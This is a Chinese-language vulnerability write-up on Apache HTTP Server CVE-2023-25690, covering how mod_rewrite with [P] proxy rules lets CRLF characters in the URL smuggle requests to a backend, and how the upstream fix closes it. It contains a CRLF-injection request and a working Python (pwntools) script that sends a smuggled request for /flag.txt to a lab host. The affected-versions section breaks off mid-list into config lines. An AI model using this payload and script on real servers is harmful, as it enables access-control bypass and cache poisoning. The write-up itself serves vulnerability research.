@@ -1,0 +1,109 @@
+# Apache HTTP Server 请求走私漏洞 CVE-2023-25690
+## 漏洞描述
+Apache HTTP Server 版本 2.4.0 到 2.4.55 上的某些 mod_proxy 配置允许 HTTP 请求走私攻击。
+启用 mod_proxy 以及特定配置的 RewriteRule 或 ProxyPassMatch
+模块时，当规则与用户提供的URL的某些部分匹配时，会因为变量替换从而造成代理请求目标错误
+例如以下配置
+    RewriteEngine on
+    RewriteRule "^/here/(.*)" "http://example.com:8080/elsewhere?$1"; [P]
+    ProxyPassReverse /here/ http://example.com:8080/
+此漏洞会造成请求拆分和走私，引起权限绕过，缓存投毒等攻击
+## 影响版本
+2.4.0 
+        ServerAdmin webmaster@localhost
+        ServerName localhost:8000
+        DocumentRoot /root/workspace/apache-bin/httpd/htdocs
+        LogLevel alert rewrite:trace3 proxy:trace8
+        ErrorLog /root/workspace/apache-bin/httpd/logs/error.log
+        CustomLog /root/workspace/apache-bin/httpd/logs/access.log combined
+        RewriteEngine on
+        RewriteRule "^/hello/(.*)" "http://10.122.255.252/index.php?name=$1" [P]
+设置日志等级，记录mod_rewrite和mod_proxy日志 `LogLevel alert rewrite:trace3
+proxy:trace8`，可以在error.log中查看
+RewriteRule可以参考mod_rewrite模块的文档
+末尾的 [P] 会将请求发送给mod_proxy模块，让apache生成一个request去请求目标后端服务器，也就是这里的10.122.255.252
+而漏洞就发生在mod_rewrite.c的hook_uri2file函数中，当我们的uri匹配到正则时，就会进行RewriteRule规则替换，然后准备一个新的请求交给mod_proxy
+**正常功能**
+我们可以打断点在modules/mappers/mod_rewrite.c的4693行，然后发送如下请求包
+    GET /hello/abc HTTP/1.1
+    Host: 10.7.1.16:8000
+这里正在解析我们的请求，取出thisserver，port，thisurl
+继续来到4717行，这里是应用rewrite规则的地方，此时左边的r->filename的值和r->uri保持一致
+当经过apply_rewrite_list函数后，r->filename会变成`"proxy:http://10.122.255.252/index.php"`，这里的写法可以参考mod_proxy模块，在上一篇的文章也有提到，然后我们的请求参数r->args也会被替换成`"name=abc"`，也就是配置文件中写的get传参
+之后会判断r->filename是不是以`proxy:`开头
+再设置r->handler为`"proxy-server"`，之后就会交给mod_proxy处理
+最后收到的响应如下
+    HTTP/1.1 200 OK
+    Date: Wed, 15 Mar 2023 16:29:39 GMT
+    Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
+    X-Powered-By: PHP/8.0.2
+    Content-Type: text/html; charset=UTF-8
+    Content-Length: 9
+    Hello abc
+**漏洞点**
+以上整个流程中，我们的可控点只有r->args，那么可以考虑从这里入手，如果我们访问的uri中带有控制字符，就有可能控制发送给mod_proxy的请求体，从而造成请求走私，类似于CRLF注入
+尝试发送如下请求，uri中携带控制字符
+    GET /hello/abc%20qqq%0d%0aABC:%20ccc HTTP/1.1
+    Host: 10.7.1.16:8000
+经过apply_rewrite_list函数后，我们的r->args被设置成了`name=$1`的形式，而`$1`也就是r->uri中匹配`"^/hello/(.*)"`的部分，值得注意的是，这里的r->uri是经过了url解码的，我们的控制字符都被解析了，这里就让我们有机会进行CRLF注入
+我们可以nc来接受以下最终发给后端服务器的请求包
+这里的r->args，也就是阴影部分，会被直接拼接到请求报文中发给后端服务器，造成了请求走私
+## 利用方式（无回显走私）
+最终可控的部分在整个请求头的中间，我们可以在pre.txt中准备一个要走私的请求
+写个脚本处理一下合成我们最终的请求，并用socket发送
+    import urllib
+    from pwn import *
+    def request_prepare():
+        hexdata = open("pre.txt", "rb").read()
+        # print(hexdata)
+        hexdata = hexdata.replace(b' ', b'%20')
+        hexdata = hexdata.replace(b'\r\n', b'%0d%0a')
+        # print(hexdata)
+        uri = b'/hello/abc%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aUser-Agent:%20curl/7.68.0%0d%0a%0d%0a' + hexdata + b'GET%20/flag.txt'
+        req = b'''GET %b HTTP/1.1\r
+    Host: 10.7.1.16:8000\r
+    \r
+    ''' % uri
+        return req
+    def send_and_recive(req):
+        rec = b''
+        ip = '10.7.1.16'
+        port = 8000
+        p = remote(ip, int(port))
+        p.send(req)
+        rec += p.recv()
+        print(rec.decode())
+        p.close()
+        return rec.decode()
+    req = request_prepare()
+    print(req)
+    # print(urllib.parse.unquote(req.decode()))
+    f = open('req.txt', 'wb')
+    f.write(req)
+    f.close()
+    res = send_and_recive(req)
+    f = open('res.txt', 'wb')
+    f.write(res.encode())
+    f.close()
+记录请求包和响应包
+在实际利用过程中，会发现这里的走私，没有产生响应队列中毒的效果，收到的请求始终是我们请求包中的第一个请求的响应
+可以用wireshark来分析一下具体的过程，这一次请求一共有四个http包
+  1. 客户端发送给代理服务器Apache的请求
+  2. Apache向后端服务器发起请求（这里包含三个）
+  3. 后端服务器给Apache的响应包（同样是三个）
+  4. Apache给客户端的响应（只有第一个响应）
+追踪TCP流
+我们的三个请求都被后端服务器处理，并且得到了三个响应，但最终只有第一个响应发送给了客户端，成功走私，但是无法看到回显
+这种现象和后端服务器有关，以上使用的是Apache 2.4.39
+同样测试了nginx和tomcat，虽然服务端都处理了三个请求，但最后发给客户端的都只有第一个
+**nginx 1.15.11**
+**tomcat 7.0.79**
+本人最终只能达到无回显走私的效果，如果有师傅研究过这个问题可以和我探讨
+## 修复分析
+参考github上的修复
+[don't forward invalid query strings · apache/httpd@d78a166
+(github.com)](https://github.com/apache/httpd/commit/d78a166fedd9d02c23e4b71d5f53bd9b2c4b9a51)
+在mod_rewrite中对r->args进行判断，如果是控制字符则会报错
+同时在mod_proxy的几个模块中也进行一模一样的判断
+在请求发给mod_proxy后又对r->args进行了判断，无法进行CRLF注入
+## Reference
